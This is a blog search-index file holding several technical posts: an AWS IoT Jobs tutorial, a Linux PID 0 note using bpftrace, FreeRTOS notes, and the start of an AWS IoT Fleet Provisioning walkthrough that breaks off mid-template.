<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Executing Remote Operations with AWS IoT Jobs: A Hands-On Tutorial</title>
      <link href="/en/posts/aws_iot_jobs.html"/>
      <url>/en/posts/aws_iot_jobs.html</url>
      
        <content type="html"><![CDATA[<h1 id="What-is-a-Job"><a href="#What-is-a-Job" class="headerlink" title="What is a Job?"></a>What is a Job?</h1><blockquote><p>A Job is a <strong>remote operation</strong> that is sent to and executed on one or more devices connected to AWS IoT. For example, you can define a Job that instructs a set of devices to download and install application or firmware updates, reboot, rotate certificates, or perform remote troubleshooting operations.</p></blockquote><h1 id="How-to-create-a-Job"><a href="#How-to-create-a-Job" class="headerlink" title="How to create a Job?"></a>How to create a Job?</h1><p>You must create a job document first.</p><blockquote><p>The Job Document is a description of the remote operations to be performed a Job</p></blockquote><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><blockquote><p>When you create a Job, you specify a list of targets that are the devices that <strong>should perform the operations</strong>. The targets can be things or thing groups or both. The Jobs feature sends a message to each target to inform it that a Job is available.</p></blockquote><h2 id="Job-Execution"><a href="#Job-Execution" class="headerlink" title="Job Execution"></a>Job Execution</h2><blockquote><p>A Job execution is an instance of a Job on a target device. The target starts an execution of a Job by downloading the Job document. It then performs the operations specified in the document, and reports its progress to AWS IoT. </p></blockquote><h1 id="Prepare-to-run-a-remote-operation-using-Jobs"><a href="#Prepare-to-run-a-remote-operation-using-Jobs" class="headerlink" title="Prepare to run a remote operation using Jobs"></a>Prepare to run a remote operation using Jobs</h1><ol><li>Setup download location (Device Client)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /home/ubuntu/workshop_dc/downloadLocation</span><br></pre></td></tr></table></figure><p>Check if the process successful</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tail -F /var/log/aws-iot-device-client/aws-iot-device-client.log</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="AWS-IoT-Job-using-embedded-c-SDK"><a href="#AWS-IoT-Job-using-embedded-c-SDK" class="headerlink" title="AWS IoT Job using embedded-c SDK"></a>AWS IoT Job using embedded-c SDK</h1><h2 id="Launch-an-EC2"><a href="#Launch-an-EC2" class="headerlink" title="Launch an EC2."></a>Launch an EC2.</h2><ul><li>AMI: ubuntu</li><li>t2.micro</li></ul><p>Networking:</p><ul><li>VPC CIDR: 10.1.0.0&#x2F;16</li><li>Public Subnet: 10.1.0.0&#x2F;24</li></ul><p>Connect to the instance and install the necessary packages</p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim git curl</span><br><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-embedded-c.git --recurse-submodules</span><br><span class="line">cd aws-iot-device-sdk-embedded-c</span><br><span class="line">mkdir -r build/bin/</span><br><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><h2 id="Create-Things"><a href="#Create-Things" class="headerlink" title="Create Things"></a>Create Things</h2><ul><li>Create Thing</li><li>Enter Thing Name, press “Next”</li><li>Select <strong>Auto-generate a new certificate</strong><br><img src="https://hackmd.io/_uploads/r1wpLeNu6.png" alt="image"></li></ul><p>Policy</p><blockquote><p>Make sure that the certificate you create have bind to policy with enough permisssion<br><strong>iot: Connect</strong><br><strong>iot: Receive</strong><br><strong>iot: Publish</strong><br><strong>iot: Subscribe</strong></p></blockquote><p><img src="https://hackmd.io/_uploads/BJkGPx4_p.png" alt="image"></p><h2 id="Download-Certificate"><a href="#Download-Certificate" class="headerlink" title="Download Certificate"></a>Download Certificate</h2><p><img src="https://hackmd.io/_uploads/SkZjLlV_T.png" alt="image"></p><p>Upload certificate to EC2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i &lt;local ssh private key&gt; &lt;cert_name&gt;pem.crt  admin@ec2-XX-XXX-XXX-XXX.compute-1.amazonaws.com:/home/admin/aws-iot-device-sdk-embedded-c/build/bin/certificates/</span><br></pre></td></tr></table></figure><p>Upload private key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -i TestKeyAccess.pem debace3e049b44eb15d67fad8ab17763cc575604f4d4a1451cc62cd4ef1498ed-private.pem.key ubuntu@ec2-54-167-159-68.compute-1.amazonaws.com:/home/ubuntu/aw</span><br><span class="line">s-iot-device-sdk-embedded-c/build/bin/certificates</span><br></pre></td></tr></table></figure><p>Upload certificates</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i TestKeyAccess.pem debace3e049b44eb15d67fad8ab17763cc575604f4d4a1451cc62cd4ef1498ed-certificate.pem.crt ubuntu@ec2-54-167-159-68.compute-1.amazonaws.com:/home/ubuntu/aws-iot-device-sdk-embedded-c/build/bin/certificates</span><br></pre></td></tr></table></figure><p>Upload AmazonRootCA1.pem</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i TestKeyAccess.pem AmazonRootCA1.pem ubuntu@ec2-54-167-159-68.compute-1.amazonaws.com:/home/ubuntu/aws-iot-device-sdk-embedded-c/build/bin/certificates</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/ByhTugNdT.png" alt="image"></p><h2 id="AWS-IoT-Jobs-Demo"><a href="#AWS-IoT-Jobs-Demo" class="headerlink" title="AWS IoT Jobs Demo"></a>AWS IoT Jobs Demo</h2><blockquote><p>Ref: <a href="https://aws.github.io/aws-iot-device-sdk-embedded-C/202012.00/docs/doxygen/output/html/jobs_demo.html">https://aws.github.io/aws-iot-device-sdk-embedded-C/202012.00/docs/doxygen/output/html/jobs_demo.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install curl libmosquitto-dev mosquitto</span><br></pre></td></tr></table></figure><h2 id="Create-Job"><a href="#Create-Job" class="headerlink" title="Create Job"></a>Create Job</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws iot create-job --job-id t12 --targets &lt;YOUR_THING_ARN&gt; \</span><br><span class="line">  --document &#x27;&#123;&quot;url&quot;:&quot;https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.8.5.tar.xz&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/B10N5g4da.png" alt="image"></p><h2 id="Execute-Job-on-the-target-device-run-the-demo-program-with-device-credentials"><a href="#Execute-Job-on-the-target-device-run-the-demo-program-with-device-credentials" class="headerlink" title="Execute Job on the target device run the demo program with device credentials"></a>Execute Job on the target device run the demo program with device credentials</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jobs_demo_mosquitto -n device1 -h abcdefg123.iot.us-east-1.amazonaws.com \</span><br><span class="line">  --certfile bbaf123456-certificate.pem.crt --keyfile bbaf123456-private.pem.key</span><br></pre></td></tr></table></figure><h2 id="Build-the-demo-program"><a href="#Build-the-demo-program" class="headerlink" title="Build the demo program"></a>Build the demo program</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /aws-iot-device-sdk-embedded-c/demos/jobs/jobs_demo_mosquitto</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/HkuCie4uT.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jobs_demo_mosquitto</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/SyW-nl4_T.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./jobs_demo_mosquitto -n &lt;Thing Name&gt; -h &lt;YOUR_IOT_ENDPOINT&gt; \</span><br><span class="line">  --certfile bbaf123456-certificate.pem.crt --keyfile bbaf123456-private.pem.key</span><br></pre></td></tr></table></figure><p>Endpoint: a2t2vimlyuhccy-ats.iot.us-east-1.amazonaws.com</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./jobs_demo_mosquitto -n </span><br><span class="line">ThingforExecuteJobs -h a2t2vimlyuhccy-ats.iot.us-east-1.amazonaws.com --certfile ~/aws-iot-device-sdk-embedded-c/build/bin/certificates/debace3e049b44eb15d67fad8ab17763cc575604f4d4a1451cc62cd4ef1498ed-certificate.pem.crt --keyfile ~/aws-iot-device-sdk-embedded-c/build/bin/certificates/debace3e049b44eb15d67fad8ab17763cc575604f4d4a1451cc62cd4ef1498ed-private.pem.key</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/BkeheZNda.png" alt="image"></p><p>Check AWSIoTLogv2</p><p><img src="https://hackmd.io/_uploads/HJR34ZEdp.png" alt="image"></p><p><img src="https://hackmd.io/_uploads/SkKsEb4dp.png" alt="image"></p><p><img src="https://hackmd.io/_uploads/ryV9N-4ua.png" alt="image"></p><h1 id="The-Download-files-by-Job-can-be-found-in-the-tmp"><a href="#The-Download-files-by-Job-can-be-found-in-the-tmp" class="headerlink" title="The Download files by Job can be found in the tmp"></a>The Download files by Job can be found in the <code>tmp</code></h1><p><img src="https://hackmd.io/_uploads/S17mOZEd6.png" alt="image"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[+] AWS Workshop- <a href="https://catalog.workshops.aws/getstartedwithawsiot/en-US/chapter5-jobs/10-dc-setup">https://catalog.workshops.aws/getstartedwithawsiot/en-US/chapter5-jobs/10-dc-setup</a></p>]]></content>
      
      
      <categories>
          
          <category> Hands-On Practices </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT </tag>
            
            <tag> SDK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Process Deep Dive-1: Knowledge of PID 0 </title>
      <link href="/en/posts/752506ab.html"/>
      <url>/en/posts/752506ab.html</url>
      
        <content type="html"><![CDATA[<h2 id="PID-0"><a href="#PID-0" class="headerlink" title="PID 0"></a>PID 0</h2><ul><li>An Idle Process used to swap all pages of processs to&#x2F;from memory&#x2F;backing store.</li><li>“Swap Process”</li><li>It was there, so Linux always have CPU to execute something</li><li>If you try to execute <code>ps</code> command on the clean Ubuntu Linux, you’ll find there was no process with “PID0” </li><li>Idle systemcall not supported since kernal 2.3.13</li></ul><blockquote><p><strong>Then how can we prove that PID0 really exist?</strong></p></blockquote><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul><li>Using <code>bpftrace</code> for tracking the kernel function <strong>hrtimer_wakeup</strong></li><li><strong>hrtimer_wakeup</strong> mean to:<ul><li>Waking up processes</li><li>Move them into runnable process</li></ul></li></ul><p><em>hrtimer_wakeup source code</em></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">##Refer to https:<span class="comment">//elixir.bootlin.com/linux/latest/source/kernel/time/hrtimer.c#L2000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">enum</span> hrtimer_restart <span class="title">hrtimer_wakeup</span><span class="params">(<span class="keyword">struct</span> hrtimer *timer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">hrtimer_sleeper</span> *t =</span><br><span class="line"><span class="built_in">container_of</span>(timer, <span class="keyword">struct</span> hrtimer_sleeper, timer);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">task_struct</span> *task = t-&gt;task;</span><br><span class="line"></span><br><span class="line">t-&gt;task = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (task)</span><br><span class="line"><span class="built_in">wake_up_process</span>(task);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> HRTIMER_NORESTART;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I open a new Amazon EC2 Instance with Ubuntu 22 LTS AMI for testing.</p><p><em>Command</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftrace -e &#x27;kfunc:hrtimer_wakeup &#123;printf(&quot;%s:%d\n&quot;,curtask-&gt;comm,curtask-&gt;pid); &#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/HJbjzQd8p.png" alt="image"></p><p>It shows there are only 1 instance of swapper: <code>swapper/0</code> with PID0.</p><p>If you open a new VM with 3 to 4 vCPU, then you execute the command again, You will find that there are 3 or4 swapper instances with PID0, so there may have <code>swapper/0</code>, <code>swapper/1</code>, <code>swapper/2</code> appears.</p><h2 id="PPID"><a href="#PPID" class="headerlink" title="PPID"></a>PPID</h2><p><img src="https://hackmd.io/_uploads/Bkp5NXuLT.png" alt="image"></p><p>If you try to execute the command <code>ps -eaf</code> on your local system, you may find there are a column named <strong>PPID</strong>, It means the <strong>Parrent Process ID</strong>.</p><p>In Linux systems, A PPID is always assigned to every process ID. <strong>It tells us which process started a particular process.</strong> Therefore, the PPID value of 0 for the init process indicates that <strong>the init process has no parent.</strong></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Refer to <strong>“The Linux Process Journey”</strong> by Dr. Shlommi Bountnaru<br>[2] <a href="https://www.baeldung.com/linux/process-pid-0">https://www.baeldung.com/linux/process-pid-0</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT </tag>
            
            <tag> OTA </tag>
            
            <tag> Firmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FreeRTOS_Note</title>
      <link href="/en/posts/8d39dbf8.html"/>
      <url>/en/posts/8d39dbf8.html</url>
      
        <content type="html"><![CDATA[<h1 id="AWS-FreeRTOS"><a href="#AWS-FreeRTOS" class="headerlink" title="AWS FreeRTOS"></a>AWS FreeRTOS</h1><blockquote><p>FreeRTOS includes libraries for connectivity, security, and over-the-air (OTA) updates. FreeRTOS also includes demo applications that show FreeRTOS features on qualified boards.</p></blockquote><blockquote><p>FreeRTOS is an open-source project. You can download the source code, contribute changes or enhancements, or report issues on the GitHub site at <a href="https://github.com/FreeRTOS/FreeRTOS">https://github.com/FreeRTOS/FreeRTOS</a>.</p></blockquote><h1 id="FreeRTOS-Architecture"><a href="#FreeRTOS-Architecture" class="headerlink" title="FreeRTOS - Architecture"></a>FreeRTOS - Architecture</h1><p>FreeRTOS contains two types of repositories</p><ul><li><strong>single library repositories</strong><ul><li>Each single library repository contains the source code for one library without any build projects or examples.</li></ul></li><li><strong>package repositories</strong><ul><li>Package repositories contain multiple libraries, and can contain <strong>preconfigured projects</strong> that demonstrate the library’s use.</li></ul></li></ul><p><img src="https://hackmd.io/_uploads/BkBxj9lEp.png" alt="image"></p><p><img src="https://hackmd.io/_uploads/HyRa3clN6.png" alt="image"></p><h1 id="FreeRTOS-Kernel-concepts"><a href="#FreeRTOS-Kernel-concepts" class="headerlink" title="FreeRTOS Kernel concepts"></a>FreeRTOS Kernel concepts</h1><p>The FreeRTOS kernel is a real-time operating system that supports numerous architectures.</p><p>Basic components including:</p><ul><li>A multitasking scheduler.</li><li>Multiple memory allocation options (including the ability to create completely statically-allocated systems). </li><li>Intertask coordination primitives, including task notifications, message queues, multiple types of semaphore, and stream and message buffers.</li><li>upport for symmetric multiprocessing (SMP) on multi-core microcontrollers.</li></ul><h2 id="No-malloc-but-pvPortMalloc"><a href="#No-malloc-but-pvPortMalloc" class="headerlink" title="No malloc() but pvPortMalloc"></a>No <code>malloc()</code> but <code>pvPortMalloc</code></h2><p>When RTOS objects are created dynamically, using the standard C library <code>malloc()</code> and <code>free()</code> functions is not always appropriate for a number of reasons:</p><ul><li>They might not be available on embedded systems.</li><li>They take up valuable code space.</li><li>They are not typically thread-safe.</li><li>They are not deterministic.</li><li>For these reasons, FreeRTOS keeps the memory allocation API in its portable layer.</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] What is FreeRTOS? - <a href="https://docs.aws.amazon.com/freertos/latest/userguide/what-is-freertos.html">https://docs.aws.amazon.com/freertos/latest/userguide/what-is-freertos.html</a><br>[2] What is FreeRTOS? - FreeRTOS architecture - <a href="https://docs.aws.amazon.com/freertos/latest/userguide/what-is-freertos.html#freertos-architecture">https://docs.aws.amazon.com/freertos/latest/userguide/what-is-freertos.html#freertos-architecture</a><br>[3] FreeRTOS kernel fundamentals - <a href="https://docs.aws.amazon.com/freertos/latest/userguide/dev-guide-freertos-kernel.html">https://docs.aws.amazon.com/freertos/latest/userguide/dev-guide-freertos-kernel.html</a><br>[4] Architecute Image Ref - <a href="https://blog.naver.com/kim1417/221540814246">https://blog.naver.com/kim1417/221540814246</a></p>]]></content>
      
      
      <categories>
          
          <category> Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> FreeRTOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fleet Provisioning - Provisioning Devices to AWS IoT in Advance</title>
      <link href="/en/posts/889a40ef.html"/>
      <url>/en/posts/889a40ef.html</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="What-is-Fleet-Provisioning"><a href="#What-is-Fleet-Provisioning" class="headerlink" title="What is Fleet Provisioning?"></a>What is Fleet Provisioning?</h2><p>Fleet Provisioning can be divided into <strong>Provisioning by Claim</strong> and <strong>Provisioning by Trusted User</strong>.</p><h3 id="Provisioning-by-Claim"><a href="#Provisioning-by-Claim" class="headerlink" title="Provisioning by Claim"></a>Provisioning by Claim</h3><p>Devices can use embedded provisioning claim certificates (special-purpose certificates) and private keys for manufacturing. If these certificates are registered with AWS IoT, the service can exchange them for a unique device certificate that the device can use for general operations.</p><h3 id="Provisioning-by-Trusted-User"><a href="#Provisioning-by-Trusted-User" class="headerlink" title="Provisioning by Trusted User"></a>Provisioning by Trusted User</h3><p>In many cases, when trusted users such as end-users or installation technicians set up devices at their deployment locations using a mobile application for the first time, the devices connect to AWS IoT.</p><blockquote><p><strong>This article mainly focuses on the Provisioning by Claim method for fleet provisioning</strong>.</p></blockquote><h2 id="Provisioning-by-Claim-Process"><a href="#Provisioning-by-Claim-Process" class="headerlink" title="Provisioning by Claim Process"></a>Provisioning by Claim Process</h2><p><img src="https://i.imgur.com/5UPLkKJ.png" alt="Imgur"></p><h2 id="Configuration-AWS-IoT-Core"><a href="#Configuration-AWS-IoT-Core" class="headerlink" title="Configuration - AWS IoT Core"></a>Configuration - AWS IoT Core</h2><h3 id="Create-Certificates-and-Public-x2F-Private-Key-Pairs"><a href="#Create-Certificates-and-Public-x2F-Private-Key-Pairs" class="headerlink" title="Create Certificates and Public&#x2F;Private Key Pairs"></a>Create Certificates and Public&#x2F;Private Key Pairs</h3><p>Generate certificates for provisioning</p><ul><li>You can do this on the AWS IoT Console under <strong>Secure</strong> &gt;&gt; <strong>Certificates</strong> &gt;&gt; <strong>Add Certificates</strong> &gt;&gt; <strong>Create Certificates</strong></li></ul><p><img src="https://i.imgur.com/ay2zm5V.png" alt="Imgur"><br><img src="https://i.imgur.com/Qnr2Olh.png" alt="Imgur"></p><ul><li>Next, a corresponding screen will appear, and you need to download the certificate and private key to your local machine. Additionally, for convenience, please download the Root CA certificate to your local machine.</li></ul><p><img src="https://i.imgur.com/kRUAGF9.png" alt="Imgur"></p><h3 id="Create-Provisioning-Template-and-Attach-Policy"><a href="#Create-Provisioning-Template-and-Attach-Policy" class="headerlink" title="Create Provisioning Template and Attach Policy"></a>Create Provisioning Template and Attach Policy</h3><ul><li>Create Provisioning Template</li></ul><p><img src="https://i.imgur.com/cG83JRG.png" alt="Imgur"></p><ul><li>Choose <strong>Provisioning devices with claim certificates</strong>, and then click <strong>Next</strong></li></ul><p><img src="https://i.imgur.com/7baFaol.png" alt="Imgur"></p><ul><li>Create an IoT service role by clicking <strong>Create Role</strong></li><li>After entering the Role Name, click <strong>View</strong></li></ul><p><img src="https://i.imgur.com/6bZNMWr.png" alt="Imgur"></p><ul><li>Attach policy</li><li>Search and attach the AWS managed policy <code>AWSIoTThingsRegistration</code></li></ul><p><img src="https://i.imgur.com/MwkIdA0.png" alt="Imgur"><br><img src="https://i.imgur.com/YW2Nfdh.png" alt="Imgur"></p><ul><li>Claim certificate policy, click <strong>Create IoT Policy</strong></li></ul><p><img src="https://i.imgur.com/21XORly.png" alt="Imgur"></p><ul><li>Enter the Policy Name and paste the sample JSON</li></ul><p><img src="https://i.imgur.com/mNKS8IC.png" alt="Imgur"></p><p>Sample IoT Policy</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span><span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hzebj7r.png" alt="Imgur"></p><ul><li>Check the certificate<br><img src="https://i.imgur.com/5y8PAPu.png" alt="Imgur"></li></ul><p>Once completed, you can proceed to set up provisioning in advance.</p><h3 id="Configure-Pre-provisioning"><a href="#Configure-Pre-provisioning" class="headerlink" title="Configure Pre-provisioning"></a>Configure Pre-provisioning</h3><p>The template example for fleet provisioning can be found at:</p><blockquote><p><a href="https://docs.aws.amazon.com/iot/latest/developerguide/provision-template.html#fleet-provisioning-example">https://docs.aws.amazon.com/iot/latest/developerguide/provision-template.html#fleet-provisioning-example</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SerialNumber&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DeviceLocation&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;LocationTable&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Seattle&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://example.aws&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resources&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;thing&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> 